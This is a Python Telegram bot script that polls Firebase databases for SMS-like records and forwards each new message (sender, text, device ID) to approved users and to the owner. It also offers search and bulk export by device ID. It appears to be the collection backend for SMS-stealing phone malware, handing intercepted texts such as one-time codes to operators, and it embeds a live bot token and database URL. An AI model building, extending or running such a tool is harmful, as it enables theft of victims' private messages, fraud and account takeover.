import os
import requests
import json
import time
import threading
import hashlib
import html
from datetime import datetime, timezone
from io import BytesIO

BOT_TOKEN = "8500713256:AAF8TjCbO7aj-3GofffCE2H5b0xSU3NUbGc"

if not BOT_TOKEN or BOT_TOKEN.strip() == "":
    print("❌ BOT_TOKEN missing!")
    raise SystemExit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
OWNER_IDS = [1451422178]
PRIMARY_ADMIN_ID = 1451422178
POLL_INTERVAL = 2
MAX_FIREBASE_PER_USER = 5

DEFAULT_FIREBASE_URL = "https://union-1-1b7ae-default-rtdb.asia-southeast1.firebasedatabase.app/.json"
DEFAULT_FIREBASE_ENABLED = True

OFFSET = None
running = True
firebase_urls = {}
seen_hashes = {}
approved_users = set(OWNER_IDS)
BOT_START_TIME = time.time()
blocked_devices = set()
used_firebase_urls = set()

default_firebase_active = False
default_firebase_thread = None

user_states = {}
user_last_command = {}

# Track already sent notifications to prevent duplicates
sent_notifications = {}
NOTIFICATION_COOLDOWN = 10  # 10 seconds cooldown for same message

# ---------- KEYBOARD ----------
def get_main_keyboard(is_admin=False):
    keyboard = [
        ["📋 My URLs", "🔍 Find Device"],
        ["📄 Export All Data", "🔄 Refresh"],
        ["🏓 Status", "🛑 Stop All"],
        ["❓ Help"]
    ]
    if is_admin:
        keyboard.append(["👑 Admin Panel"])
    return {"keyboard": keyboard, "resize_keyboard": True}

def get_admin_keyboard():
    keyboard = [
        ["👥 Approve", "🚫 Unapprove"],
        ["📋 Users", "📊 Stats"],
        ["🔒 Block", "🔓 Unblock"],
        ["📵 Blocked", "🌐 Default FB"],
        ["📢 Broadcast", "🛑 Stop All"],
        ["◀️ Back"]
    ]
    return {"keyboard": keyboard, "resize_keyboard": True}

def get_default_fb_keyboard():
    keyboard = [
        ["▶️ Start", "⏹️ Stop"],
        ["🔄 Refresh", "📊 Status"],
        ["◀️ Back"]
    ]
    return {"keyboard": keyboard, "resize_keyboard": True}

# ---------- UTILS ----------
def normalize_json_url(url):
    if not url:
        return None
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u = u + "/.json"
    return u

def send_msg(chat_id, text, parse_mode="HTML", reply_markup=None, keyboard=None):
    try:
        payload = {"chat_id": chat_id, "text": text}
        if parse_mode:
            payload["parse_mode"] = parse_mode
        if reply_markup:
            payload["reply_markup"] = reply_markup
        elif keyboard:
            payload["reply_markup"] = keyboard
        requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        print(f"send_msg error: {e}")

def send_document(chat_id, file_bytes, filename, caption=""):
    try:
        files = {'document': (filename, BytesIO(file_bytes), 'text/plain')}
        data = {'chat_id': chat_id, 'caption': caption}
        requests.post(f"{API_URL}/sendDocument", files=files, data=data, timeout=30)
    except Exception as e:
        print(f"Send document error: {e}")
        send_msg(chat_id, f"❌ Failed: {e}")

def get_updates():
    global OFFSET
    try:
        params = {"timeout": 20}
        if OFFSET:
            params["offset"] = OFFSET
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30).json()
        if r.get("result"):
            OFFSET = r["result"][-1]["update_id"] + 1
        return r.get("result", [])
    except Exception as e:
        print("get_updates error:", e)
        return []

def http_get_json(url):
    try:
        r = requests.get(url, timeout=12)
        r.raise_for_status()
        return r.json()
    except:
        return None

def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "number"}:
        score += 2
    if keys & {"time", "timestamp", "date", "created_at"}:
        score += 1
    if keys & {"device", "deviceid", "imei", "device_id"}:
        score += 1
    return score >= 3

def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found

def extract_fields(obj):
    device = obj.get("device") or obj.get("deviceId") or obj.get("device_id") or obj.get("imei") or obj.get("id") or "Unknown"
    sender = obj.get("from") or obj.get("sender") or obj.get("address") or obj.get("number") or "Unknown"
    message = obj.get("message") or obj.get("msg") or obj.get("body") or obj.get("text") or ""
    ts = obj.get("time") or obj.get("timestamp") or obj.get("date") or obj.get("created_at") or None
    if isinstance(ts, (int, float)):
        try:
            ts = datetime.fromtimestamp(ts/1000 if ts > 10000000000 else ts).strftime("%d/%m/%Y, %I:%M:%S %p")
        except:
            ts = str(ts)
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    return {
        "device": device,
        "sender": sender,
        "message": message,
        "time": ts,
        "raw_data": obj
    }

def compute_hash(path, obj):
    try:
        return hashlib.sha256((path + json.dumps(obj, sort_keys=True, default=str)).encode()).hexdigest()
    except:
        return hashlib.sha256((path + str(obj)).encode()).hexdigest()

def get_message_key(fields):
    """Create unique key for a message to prevent duplicates"""
    device = fields.get("device", "")
    sender = fields.get("sender", "")
    message = fields.get("message", "")[:100]  # First 100 chars
    return hashlib.md5(f"{device}|{sender}|{message}".encode()).hexdigest()

def notify_user(chat_id, fields, is_default=False):
    device_id = fields.get("device", "")
    if device_id in blocked_devices:
        return
    
    # Check if this exact message was sent recently
    msg_key = get_message_key(fields)
    now = time.time()
    if msg_key in sent_notifications:
        if now - sent_notifications[msg_key] < NOTIFICATION_COOLDOWN:
            return  # Skip duplicate within cooldown
    sent_notifications[msg_key] = now
    
    # Clean old notifications
    for key in list(sent_notifications.keys()):
        if now - sent_notifications[key] > 60:
            del sent_notifications[key]
    
    device = html.escape(str(fields.get("device", "Unknown")))
    sender = html.escape(str(fields.get("sender", "Unknown")))
    message = html.escape(str(fields.get("message", "")))
    t = html.escape(str(fields.get("time", "")))
    
    text = f"🆕 <b>New SMS</b>\n\n📱 Device: <code>{device}</code>\n👤 From: <b>{sender}</b>\n💬 Message: {message}\n🕐 Time: {t}"
    
    if is_default:
        send_msg(OWNER_IDS, text)
    else:
        send_msg(chat_id, text)
        send_msg(OWNER_IDS, text)

# ---------- MONITORING ----------
def monitor_loop(chat_id, base_url, is_default=False):
    url = normalize_json_url(base_url)
    
    if is_default:
        seen_key = "__DEFAULT__"
        if seen_key not in seen_hashes:
            seen_hashes[seen_key] = {}
        if base_url not in seen_hashes[seen_key]:
            seen_hashes[seen_key][base_url] = set()
        seen = seen_hashes[seen_key][base_url]
    else:
        seen = seen_hashes.setdefault(chat_id, {}).setdefault(base_url, set())
    
    # Load existing messages
    snap = http_get_json(url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen.add(compute_hash(p, o))
    
    while (is_default and default_firebase_active) or (not is_default and base_url in firebase_urls.get(chat_id, [])):
        snap = http_get_json(url)
        if snap:
            nodes = find_sms_nodes(snap, "")
            for path, obj in nodes:
                h = compute_hash(path, obj)
                if h not in seen:
                    seen.add(h)
                    fields = extract_fields(obj)
                    if fields.get("device", "") not in blocked_devices:
                        if is_default:
                            notify_user(None, fields, is_default=True)
                        else:
                            notify_user(chat_id, fields, is_default=False)
        time.sleep(POLL_INTERVAL)

def start_watcher(chat_id, base_url):
    if chat_id not in firebase_urls:
        firebase_urls[chat_id] = []
    if base_url in firebase_urls[chat_id]:
        send_msg(chat_id, f"⚠️ Already monitoring")
        return False
    
    if len(firebase_urls.get(chat_id, [])) >= MAX_FIREBASE_PER_USER:
        send_msg(chat_id, f"❌ Limit {MAX_FIREBASE_PER_USER}")
        return False
    
    firebase_urls[chat_id].append(base_url)
    used_firebase_urls.add(base_url)
    
    t = threading.Thread(target=monitor_loop, args=(chat_id, base_url, False), daemon=True)
    t.start()
    
    send_msg(chat_id, f"✅ Monitoring started")
    return True

def stop_watcher_single(chat_id, base_url=None):
    if chat_id not in firebase_urls:
        return False
    
    if base_url is None:
        firebase_urls[chat_id] = []
        send_msg(chat_id, "🛑 Stopped all")
    else:
        if base_url in firebase_urls[chat_id]:
            firebase_urls[chat_id].remove(base_url)
            send_msg(chat_id, f"🛑 Stopped")
    
    if not firebase_urls.get(chat_id):
        firebase_urls.pop(chat_id, None)
    return True

def start_default_firebase():
    global default_firebase_active, default_firebase_thread
    if default_firebase_active:
        return True
    
    if not http_get_json(normalize_json_url(DEFAULT_FIREBASE_URL)):
        send_msg(OWNER_IDS, "❌ Default Firebase not accessible")
        return False
    
    default_firebase_active = True
    default_firebase_thread = threading.Thread(target=monitor_loop, args=(None, DEFAULT_FIREBASE_URL, True), daemon=True)
    default_firebase_thread.start()
    send_msg(OWNER_IDS, "✅ Default Firebase started")
    return True

def stop_default_firebase():
    global default_firebase_active
    default_firebase_active = False
    send_msg(OWNER_IDS, "🛑 Default Firebase stopped")
    return True

# ---------- SEARCH FUNCTIONS ----------
def get_all_records(snapshot, device_id, records=None):
    if records is None:
        records = []
    
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            if str(k) == str(device_id) and isinstance(v, dict):
                records.append(v)
            if isinstance(v, dict):
                device_fields = ["device", "deviceId", "device_id", "DeviceID", "imei", "id"]
                for field in device_fields:
                    if field in v and str(v[field]) == str(device_id):
                        records.append(v)
                        break
            if isinstance(v, (dict, list)):
                get_all_records(v, device_id, records)
    elif isinstance(snapshot, list):
        for v in snapshot:
            if isinstance(v, dict):
                device_fields = ["device", "deviceId", "device_id", "DeviceID", "imei", "id"]
                for field in device_fields:
                    if field in v and str(v[field]) == str(device_id):
                        records.append(v)
                        break
            if isinstance(v, (dict, list)):
                get_all_records(v, device_id, records)
    
    return records

def get_unique_records(records):
    unique = []
    seen = set()
    for rec in records:
        rec_str = json.dumps(rec, sort_keys=True, default=str)
        if rec_str not in seen:
            seen.add(rec_str)
            unique.append(rec)
    return unique

def format_record(rec, index=None):
    """Format record - ONLY the data, NO URL, NO extra text"""
    lines = []
    if index is not None:
        lines.append(f"📌 <b>Record #{index}</b>")
        lines.append("")
    
    # Show ALL fields from the record
    for key, value in rec.items():
        if value is not None and value != "":
            lines.append(f"<b>{html.escape(str(key))}</b>: <code>{html.escape(str(value))}</code>")
    
    return "\n".join(lines)

def export_all_data(chat_id, device_id):
    urls = firebase_urls.get(chat_id, [])
    if not urls:
        return None, "No active URLs"
    
    all_records = []
    for url in urls:
        snap = http_get_json(normalize_json_url(url))
        if snap:
            records = get_all_records(snap, device_id)
            all_records.extend(records)
    
    unique_records = get_unique_records(all_records)
    
    if not unique_records:
        return None, f"No records for: {device_id}"
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"device_{device_id}_{timestamp}.txt"
    
    content = []
    content.append("=" * 80)
    content.append(f"DEVICE EXPORT - {device_id}")
    content.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    content.append(f"Total Records: {len(unique_records)}")
    content.append("=" * 80)
    content.append("")
    
    for idx, rec in enumerate(unique_records, 1):
        content.append(f"[RECORD #{idx}]")
        content.append("-" * 40)
        for k, v in rec.items():
            content.append(f"{k}: {v}")
        content.append("")
    
    return "\n".join(content).encode('utf-8'), filename

# ---------- HELPERS ----------
def is_owner(user_id):
    return user_id in OWNER_IDS

def is_approved(user_id):
    return user_id in approved_users or is_owner(user_id)

def format_uptime(seconds):
    days = seconds // 86400
    seconds %= 86400
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    parts = []
    if days: parts.append(f"{days}d")
    if hours: parts.append(f"{hours}h")
    if minutes: parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)

# ---------- COMMAND HANDLING ----------
def handle_update(u):
    global running
    
    if "callback_query" in u:
        try:
            requests.post(f"{API_URL}/answerCallbackQuery", json={"callback_query_id": u["callback_query"]["id"]})
        except:
            pass
        return
    
    msg = u.get("message") or {}
    chat = msg.get("chat", {}) or {}
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()
    
    if not chat_id:
        return
    
    # Handle waiting states
    if chat_id in user_states:
        state = user_states[chat_id]
        if state == "waiting_for_device":
            del user_states[chat_id]
            text = f"/find {text}"
        elif state == "waiting_for_export":
            del user_states[chat_id]
            text = f"/finda {text}"
        elif state == "waiting_for_approve" and is_owner(chat_id):
            del user_states[chat_id]
            text = f"/approve {text}"
        elif state == "waiting_for_unapprove" and is_owner(chat_id):
            del user_states[chat_id]
            text = f"/unapprove {text}"
        elif state == "waiting_for_block" and is_owner(chat_id):
            del user_states[chat_id]
            text = f"/block {text}"
        elif state == "waiting_for_unblock" and is_owner(chat_id):
            del user_states[chat_id]
            text = f"/unblock {text}"
        elif state == "waiting_for_broadcast" and is_owner(chat_id):
            del user_states[chat_id]
            text = f"/broadcast {text}"
    
    # Handle button texts
    is_admin = is_owner(chat_id)
    
    # Main menu buttons
    if text == "📋 My URLs":
        urls = firebase_urls.get(chat_id, [])
        if not urls:
            send_msg(chat_id, "ℹ️ No active URLs", keyboard=get_main_keyboard(is_admin))
        else:
            msg_text = f"📋 Your URLs ({len(urls)}):\n\n" + "\n".join([f"{i+1}. <code>{url}</code>" for i, url in enumerate(urls)])
            send_msg(chat_id, msg_text, keyboard=get_main_keyboard(is_admin))
        return
    
    if text == "🔍 Find Device":
        send_msg(chat_id, "🔍 Send Device ID:\n\nExample: de503ff1e58b1888", keyboard=get_main_keyboard(is_admin))
        user_states[chat_id] = "waiting_for_device"
        return
    
    if text == "📄 Export All Data":
        send_msg(chat_id, "📄 Send Device ID to export:\n\nExample: de503ff1e58b1888", keyboard=get_main_keyboard(is_admin))
        user_states[chat_id] = "waiting_for_export"
        return
    
    if text == "🔄 Refresh":
        send_msg(chat_id, "✅ Cache refreshed", keyboard=get_main_keyboard(is_admin))
        return
    
    if text == "🏓 Status":
        uptime = format_uptime(int(time.time() - BOT_START_TIME))
        msg_text = f"🏓 <b>Bot Status</b>\n\n✅ Online\n⏱ Uptime: {uptime}\n📡 URLs: {len(firebase_urls.get(chat_id, []))}/{MAX_FIREBASE_PER_USER}"
        send_msg(chat_id, msg_text, keyboard=get_main_keyboard(is_admin))
        return
    
    if text == "🛑 Stop All":
        stop_watcher_single(chat_id)
        send_msg(chat_id, "🛑 Stopped", keyboard=get_main_keyboard(is_admin))
        return
    
    if text == "❓ Help":
        help_text = "📚 <b>Commands</b>\n\n/find <id> - Search (first 3 unique)\n/finda <id> - Export all\n/start - Welcome\n/stop - Stop\n/list - Your URLs\n/ping - Status\n/help - Help"
        send_msg(chat_id, help_text, keyboard=get_main_keyboard(is_admin))
        return
    
    if text == "👑 Admin Panel" and is_admin:
        send_msg(chat_id, "👑 Admin Panel", keyboard=get_admin_keyboard())
        return
    
    # Admin panel buttons
    if text == "👥 Approve" and is_admin:
        send_msg(chat_id, "Send user ID: /approve 123456789", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_approve"
        return
    
    if text == "🚫 Unapprove" and is_admin:
        send_msg(chat_id, "Send user ID: /unapprove 123456789", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_unapprove"
        return
    
    if text == "📋 Users" and is_admin:
        if not approved_users:
            send_msg(chat_id, "No users", keyboard=get_admin_keyboard())
            return
        lines = [f"{'👑' if uid in OWNER_IDS else '👤'} <code>{uid}</code>" for uid in sorted(approved_users)]
        send_msg(chat_id, "✅ Users:\n" + "\n".join(lines), keyboard=get_admin_keyboard())
        return
    
    if text == "📊 Stats" and is_admin:
        stats = f"📊 Stats\n\nApproved: {len(approved_users)}\nActive: {len(firebase_urls)}\nBlocked: {len(blocked_devices)}\nDefault: {'✅' if default_firebase_active else '❌'}"
        send_msg(chat_id, stats, keyboard=get_admin_keyboard())
        return
    
    if text == "🔒 Block" and is_admin:
        send_msg(chat_id, "Send device ID: /block de503ff1e58b1888", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_block"
        return
    
    if text == "🔓 Unblock" and is_admin:
        send_msg(chat_id, "Send device ID: /unblock de503ff1e58b1888", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_unblock"
        return
    
    if text == "📵 Blocked" and is_admin:
        devices = list(blocked_devices)
        if not devices:
            send_msg(chat_id, "No blocked devices", keyboard=get_admin_keyboard())
        else:
            send_msg(chat_id, "🚫 Blocked:\n" + "\n".join([f"• <code>{d}</code>" for d in devices]), keyboard=get_admin_keyboard())
        return
    
    if text == "🌐 Default FB" and is_admin:
        send_msg(chat_id, "🌐 Default Firebase", keyboard=get_default_fb_keyboard())
        return
    
    if text == "📢 Broadcast" and is_admin:
        send_msg(chat_id, "Send message: /broadcast Hello", keyboard=get_admin_keyboard())
        user_states[chat_id] = "waiting_for_broadcast"
        return
    
    if text == "🛑 Stop All" and is_admin:
        for uid in list(firebase_urls.keys()):
            stop_watcher_single(uid)
        send_msg(chat_id, "✅ Stopped all", keyboard=get_admin_keyboard())
        return
    
    # Default Firebase buttons
    if text == "▶️ Start" and is_admin:
        start_default_firebase()
        send_msg(chat_id, "✅ Started", keyboard=get_default_fb_keyboard())
        return
    
    if text == "⏹️ Stop" and is_admin:
        stop_default_firebase()
        send_msg(chat_id, "✅ Stopped", keyboard=get_default_fb_keyboard())
        return
    
    if text == "🔄 Refresh" and is_admin:
        send_msg(chat_id, "✅ Refreshed", keyboard=get_default_fb_keyboard())
        return
    
    if text == "📊 Status" and is_admin:
        status = "Active ✅" if default_firebase_active else "Inactive ❌"
        send_msg(chat_id, f"Default Firebase: {status}", keyboard=get_default_fb_keyboard())
        return
    
    if text == "◀️ Back" and is_admin:
        send_msg(chat_id, "Admin Panel", keyboard=get_admin_keyboard())
        return
    
    if text == "◀️ Back" and not is_admin:
        send_msg(chat_id, "Main Menu", keyboard=get_main_keyboard(is_admin))
        return
    
    # Process commands
    if not text:
        return
    
    lower_text = text.lower()
    
    if not is_approved(chat_id):
        from_user = msg.get("from", {}) or {}
        first_name = from_user.get("first_name", "")
        username = from_user.get("username", None)
        reply_markup = {"inline_keyboard": [[{"text": "📨 Contact Admin", "url": f"tg://user?id={PRIMARY_ADMIN_ID}"}]]}
        send_msg(chat_id, f"❌ Not approved.\n🆔 ID: <code>{chat_id}</code>", reply_markup=reply_markup)
        owner_text = f"⚠️ New user:\nID: <code>{chat_id}</code>\nName: {html.escape(first_name)}\nApprove: /approve {chat_id}"
        if username:
            owner_text += f"\nUsername: @{html.escape(username)}"
        send_msg(OWNER_IDS, owner_text)
        return
    
    # /start
    if lower_text == "/start":
        if chat_id in user_last_command and time.time() - user_last_command[chat_id] < 5:
            return
        user_last_command[chat_id] = time.time()
        welcome = "👋 <b>Welcome!</b>\n\nSend Firebase URL to start\n/find <id> - Search\n/finda <id> - Export"
        send_msg(chat_id, welcome, keyboard=get_main_keyboard(is_admin))
        return
    
    # /ping
    if lower_text == "/ping":
        send_msg(chat_id, f"🏓 Online\n⏱ Uptime: {format_uptime(int(time.time() - BOT_START_TIME))}", keyboard=get_main_keyboard(is_admin))
        return
    
    # /stop
    if lower_text.startswith("/stop"):
        parts = text.split(maxsplit=1)
        if len(parts) == 1:
            stop_watcher_single(chat_id)
        else:
            stop_watcher_single(chat_id, parts[1])
        send_msg(chat_id, "✅ Done", keyboard=get_main_keyboard(is_admin))
        return
    
    # /list
    if lower_text == "/list":
        urls = firebase_urls.get(chat_id, [])
        if not urls:
            send_msg(chat_id, "ℹ️ No URLs", keyboard=get_main_keyboard(is_admin))
        else:
            msg_text = "📋 Your URLs:\n\n" + "\n".join([f"{i+1}. <code>{url}</code>" for i, url in enumerate(urls)])
            send_msg(chat_id, msg_text, keyboard=get_main_keyboard(is_admin))
        return
    
    # Admin commands
    if is_admin:
        if lower_text == "/default_start":
            start_default_firebase()
            send_msg(chat_id, "✅ Started", keyboard=get_admin_keyboard())
            return
        if lower_text == "/default_stop":
            stop_default_firebase()
            send_msg(chat_id, "✅ Stopped", keyboard=get_admin_keyboard())
            return
        if lower_text == "/approve":
            parts = text.split()
            if len(parts) >= 2:
                try:
                    target = int(parts[1])
                    approved_users.add(target)
                    send_msg(chat_id, f"✅ Approved: <code>{target}</code>", keyboard=get_admin_keyboard())
                    send_msg(target, "✅ Approved! Send /start")
                except:
                    send_msg(chat_id, "❌ Invalid", keyboard=get_admin_keyboard())
            return
        if lower_text == "/unapprove":
            parts = text.split()
            if len(parts) >= 2:
                try:
                    target = int(parts[1])
                    if target in OWNER_IDS:
                        send_msg(chat_id, "❌ Cannot", keyboard=get_admin_keyboard())
                        return
                    if target in approved_users:
                        approved_users.remove(target)
                        stop_watcher_single(target)
                        send_msg(chat_id, f"✅ Removed: <code>{target}</code>", keyboard=get_admin_keyboard())
                        send_msg(target, "❌ Access revoked")
                except:
                    send_msg(chat_id, "❌ Invalid", keyboard=get_admin_keyboard())
            return
        if lower_text == "/block":
            parts = text.split()
            if len(parts) >= 2:
                blocked_devices.add(parts[1])
                send_msg(chat_id, f"✅ Blocked: <code>{parts[1]}</code>", keyboard=get_admin_keyboard())
            return
        if lower_text == "/unblock":
            parts = text.split()
            if len(parts) >= 2:
                blocked_devices.discard(parts[1])
                send_msg(chat_id, f"✅ Unblocked: <code>{parts[1]}</code>", keyboard=get_admin_keyboard())
            return
        if lower_text == "/broadcast":
            parts = text.split(maxsplit=1)
            if len(parts) >= 2:
                success = 0
                for uid in approved_users:
                    try:
                        send_msg(uid, f"📢 Broadcast\n\n{parts[1]}")
                        success += 1
                    except:
                        pass
                send_msg(chat_id, f"✅ Sent to {success} users", keyboard=get_admin_keyboard())
            return
    
    # /finda - Export
    if lower_text.startswith("/finda"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /finda device_id", keyboard=get_main_keyboard(is_admin))
            return
        device = parts[1].strip()
        send_msg(chat_id, f"📤 Exporting <code>{device}</code>...", keyboard=get_main_keyboard(is_admin))
        file_content, filename = export_all_data(chat_id, device)
        if file_content is None:
            send_msg(chat_id, filename, keyboard=get_main_keyboard(is_admin))
        else:
            send_document(chat_id, file_content, filename, f"Export: {device}")
        return
    
    # /find - Search (FIRST 3 UNIQUE, NO URL, FULL DATA)
    if lower_text.startswith("/find"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_msg(chat_id, "Usage: /find device_id\n\nExample: /find de503ff1e58b1888", keyboard=get_main_keyboard(is_admin))
            return
        
        device = parts[1].strip()
        urls = firebase_urls.get(chat_id, [])
        
        if not urls:
            send_msg(chat_id, "❌ No URLs. Send Firebase URL first!", keyboard=get_main_keyboard(is_admin))
            return
        
        # Collect all records
        all_records = []
        seen_keys = set()
        
        for url in urls:
            snap = http_get_json(normalize_json_url(url))
            if snap:
                records = get_all_records(snap, device)
                for rec in records:
                    rec_key = json.dumps(rec, sort_keys=True, default=str)
                    if rec_key not in seen_keys:
                        seen_keys.add(rec_key)
                        all_records.append(rec)
        
        # Get first 3 unique records
        unique_records = all_records[:3]
        
        if unique_records:
            total = len(all_records)
            send_msg(chat_id, f"🔍 Found {total} record(s) for: <code>{device}</code>\n", keyboard=get_main_keyboard(is_admin))
            
            for idx, rec in enumerate(unique_records, 1):
                formatted = format_record(rec, idx)
                send_msg(chat_id, formatted, keyboard=get_main_keyboard(is_admin))
            
            if total > 3:
                send_msg(chat_id, f"📌 {total - 3} more. Use /finda {device} to export all.", keyboard=get_main_keyboard(is_admin))
        else:
            send_msg(chat_id, f"🔍 No records for: <code>{device}</code>", keyboard=get_main_keyboard(is_admin))
        return
    
    # /help
    if lower_text == "/help":
        help_text = "📚 <b>Commands</b>\n\n/find <id> - Search (first 3 unique)\n/finda <id> - Export all\n/start - Welcome\n/stop - Stop\n/list - URLs\n/ping - Status\n/help - Help"
        send_msg(chat_id, help_text, keyboard=get_main_keyboard(is_admin))
        return
    
    # Firebase URL
    if text.startswith("http"):
        if text == DEFAULT_FIREBASE_URL and not is_admin:
            send_msg(chat_id, "❌ Admin only", keyboard=get_main_keyboard(is_admin))
            return
        
        if not http_get_json(normalize_json_url(text)):
            send_msg(chat_id, "❌ Invalid URL", keyboard=get_main_keyboard(is_admin))
            return
        
        start_watcher(chat_id, text)
        send_msg(OWNER_IDS, f"User <code>{chat_id}</code> started:\n<code>{text}</code>")
        return
    
    # Unknown
    send_msg(chat_id, "❓ Unknown. Use /help", keyboard=get_main_keyboard(is_admin))

# ---------- MAIN ----------
def main():
    send_msg(OWNER_IDS, "🤖 Bot Started!\n✅ No duplicates\n✅ No URL in results\n✅ Full records only")
    print("=" * 50)
    print("🤖 BOT STARTED")
    print("✅ NO duplicate notifications")
    print("✅ NO URL in search results")
    print("✅ Full record display")
    print("=" * 50)
    
    if DEFAULT_FIREBASE_ENABLED:
        time.sleep(2)
        start_default_firebase()
    
    while running:
        updates = get_updates()
        for u in updates:
            try:
                handle_update(u)
            except Exception as e:
                print(f"Error: {e}")
        time.sleep(0.5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        running = False
        print("\n🛑 Stopping...")
    except Exception as e:
        print(f"Fatal: {e}")
        send_msg(OWNER_IDS, f"❌ Crash: {str(e)}")